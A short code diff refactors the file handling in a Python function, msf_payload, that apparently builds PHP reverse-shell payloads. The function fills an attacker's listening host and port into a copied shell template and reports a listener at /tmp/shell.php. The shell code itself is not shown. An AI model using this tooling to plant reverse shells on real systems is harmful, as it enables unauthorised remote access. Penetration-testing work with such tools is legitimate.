@@ -35,14 +35,13 @@ def msf_payload():
 
     copy2(SHELL, filepath)
 
-    with open(filepath, 'r') as f:
+    with open(filepath, 'r+') as f:
         payload = f.read()
-
-    payload = payload.replace("127.0.0.1", lhost)
-    payload = payload.replace("4444", lport)
-
-    with open(filepath, 'w') as f:
+        payload = payload.replace("127.0.0.1", lhost)
+        payload = payload.replace("4444", lport)
+        f.seek(0)
         f.write(payload)
+        f.truncate()
 
     print(colors("[+] Success! ", 92))
     print(colors("[~] listener: /tmp/shell.php", 93))
